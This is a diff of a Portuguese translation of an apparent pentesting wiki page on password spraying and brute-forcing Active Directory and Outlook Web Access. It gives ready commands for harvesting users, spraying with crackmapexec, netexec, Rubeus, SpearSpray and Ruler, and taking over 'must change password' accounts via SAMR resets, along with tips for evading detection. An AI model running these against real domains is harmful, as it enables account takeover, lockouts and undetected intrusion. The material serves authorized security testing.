@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Uma vez que você tenha encontrado vários **valid usernames**, você pode tentar as **most common passwords** (tenha em mente a **password policy** do ambiente) com cada um dos discovered users.\
-Por **default** o **minimum password length** é **7**.
+Uma vez que você encontrou vários **valid usernames** pode tentar as **common passwords** mais usadas (tenha em mente a password policy do ambiente) com cada um dos usuários descobertos.\
+Por **default** o **minimum** **password** **length** é **7**.
 
 Listas de common usernames também podem ser úteis: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Observe que você **could lockout some accounts if you try several wrong passwords** (por **default** mais de 10).
+Observe que você **could lockout some accounts if you try several wrong passwords** (por padrão mais de 10).
 
-### Obter password policy
+### Get password policy
 
-Se você tiver algumas user credentials ou um shell como domain user, você pode **obter a password policy com**:
+Se você tiver algumas user credentials ou um shell como domain user você pode **get the password policy with**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Exploração a partir do Linux (ou todos)
+### Exploração a partir de Linux (ou todos)
 
 - Usando **crackmapexec:**
 ```bash
@@ -69,7 +69,7 @@ done
 ```
 #### Do Windows
 
-- Usando a versão do [Rubeus](https://github.com/Zer1t0/Rubeus) com o brute module:
+- Com a versão do [Rubeus](https://github.com/Zer1t0/Rubeus) com o brute module:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,7 +77,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Com [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Ele pode gerar usuários do domínio por padrão, obterá a política de senhas do domínio e limitará as tentativas de acordo com ela):
+- Com [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Ele pode gerar usuários do domínio por padrão e obterá a política de senhas do domínio e limitará as tentativas de acordo com ela):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -85,12 +85,12 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-### Identificar e assumir contas "Password must change at next logon" (SAMR)
+### Identificar e Assumir Contas "Password must change at next logon" (SAMR)
 
-Uma técnica de baixo ruído é usar password spraying com uma senha benign/empty e detectar contas que retornam STATUS_PASSWORD_MUST_CHANGE, o que indica que a senha foi forçosamente expirada e pode ser alterada sem conhecer a antiga.
+Uma técnica de baixo ruído é testar uma password benign/empty e identificar contas que retornem STATUS_PASSWORD_MUST_CHANGE, o que indica que a password foi forçada a expirar e pode ser alterada sem conhecer a anterior.
 
 Fluxo de trabalho:
-- Enumerar usuários (RID brute via SAMR) para construir a lista de alvos:
+- Enumerar utilizadores (RID brute via SAMR) para construir a lista de alvos:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -99,12 +99,12 @@ Fluxo de trabalho:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Faça password spraying com senha vazia e continue após acertos para capturar contas que devem alterar a senha no próximo logon:
+- Spray uma password vazia e continue nos hits para capturar contas que devem mudar no próximo logon:
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- Para cada acerto, altere a senha via SAMR com o módulo do NetExec (não é necessária a senha antiga quando "must change" está definida):
+- Para cada acerto, altere a senha via SAMR com o módulo do NetExec (não é necessária a senha antiga quando "must change" está definido):
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -114,26 +114,26 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 Notas operacionais:
-- Garanta que o relógio do host esteja sincronizado com o DC antes de operações baseadas em Kerberos: `sudo ntpdate <dc_fqdn>`.
-- Um [+] sem (Pwn3d!) em alguns módulos (por exemplo, RDP/WinRM) significa que os creds são válidos, mas a conta não possui direitos de logon interativo.
+- Certifique-se de que o relógio do host esteja sincronizado com o DC antes de operações baseadas em Kerberos: `sudo ntpdate <dc_fqdn>`.
+- Um [+] sem (Pwn3d!) em alguns módulos (por exemplo, RDP/WinRM) significa que as creds são válidas, mas a conta não possui direitos de logon interativo.
 
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-### Kerberos pre-auth spraying com direcionamento LDAP e limitação ciente de PSO (SpearSpray)
+### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying reduz ruído vs tentativas de bind SMB/NTLM/LDAP e se alinha melhor com as políticas de lockout do AD. O SpearSpray combina direcionamento baseado em LDAP, um pattern engine e awareness de políticas (domain policy + PSOs + buffer do badPwdCount) para spray de forma precisa e segura. Também pode taggar principals comprometidos no Neo4j para pathing do BloodHound.
+Kerberos pre-auth–based spraying reduz o ruído em comparação com tentativas de bind SMB/NTLM/LDAP e se alinha melhor com as políticas de lockout do AD. SpearSpray combina direcionamento orientado por LDAP, um motor de padrões e consciência de políticas (domain policy + PSOs + buffer badPwdCount) para sprayar de forma precisa e segura. Também pode marcar principais comprometidos no Neo4j para pathing do BloodHound.
 
 Key ideas:
-- LDAP user discovery com paginação e suporte a LDAPS, opcionalmente usando filtros LDAP customizados.
-- Domain lockout policy + PSO-aware filtering para deixar um buffer configurável de tentativas (threshold) e evitar bloquear usuários.
-- Kerberos pre-auth validation usando bindings gssapi rápidos (gera 4768/4771 nos DCs ao invés de 4625).
-- Geração de senha por usuário baseada em pattern, usando variáveis como nomes e valores temporais derivados do pwdLastSet de cada usuário.
-- Controle de throughput com threads, jitter e máximo de requests por segundo.
-- Integração opcional com Neo4j para marcar usuários com controle para BloodHound.
+- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
+- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
+- Throughput control with threads, jitter, and max requests per second.
+- Optional Neo4j integration to mark owned users for BloodHound.
 
-Uso básico e descoberta:
+Basic usage and discovery:
 ```bash
 # List available pattern variables
 spearspray -l
@@ -144,7 +144,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # LDAPS (TCP/636)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
 ```
-Segmentação e controle de padrões:
+Direcionamento e controle de padrão:
 ```bash
 # Custom LDAP filter (e.g., target specific OU/attributes)
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
@@ -153,7 +153,7 @@ spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
 # Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
 ```
-Controles de sigilo e segurança:
+Controles de furtividade e segurança:
 ```bash
 # Control concurrency, add jitter, and cap request rate
 spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
@@ -174,29 +174,29 @@ Visão geral do sistema de padrões (patterns.txt):
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-Variáveis disponíveis incluem:
+Available variables include:
 - {name}, {samaccountname}
-- Temporais a partir do pwdLastSet de cada usuário (ou whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Ajudantes de composição e token da org: {separator}, {suffix}, {extra}
+- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Composition helpers and org token: {separator}, {suffix}, {extra}
 
-Notas operacionais:
-- Prefira consultar o PDC-emulator com -dc para obter o badPwdCount mais autoritativo e informações relacionadas à política.
-- Os resets de badPwdCount são acionados na próxima tentativa após a janela de observação; use o limiar e a temporização para agir com segurança.
-- As tentativas de pré-autenticação Kerberos aparecem como 4768/4771 na telemetria do DC; use jitter e rate-limiting para se misturar.
+Operational notes:
+- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
+- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
+- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.
 
-> Dica: O tamanho de página LDAP padrão do SpearSpray é 200; ajuste com -lps conforme necessário.
+> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
 
 ## Outlook Web Access
 
-Existem várias ferramentas para p**assword spraying outlook**.
+Existem múltiplas ferramentas para p**assword spraying outlook**.
 
 - Com [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- Com [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- com [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
 - Com [Ruler](https://github.com/sensepost/ruler) (confiável!)
 - Com [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Com [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Para usar qualquer uma dessas ferramentas, você precisa de uma lista de usuários e de uma senha / uma pequena lista de senhas para spray.
+Para usar qualquer uma dessas ferramentas, você precisa de uma lista de usuários e de uma password / uma pequena lista de passwords para spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
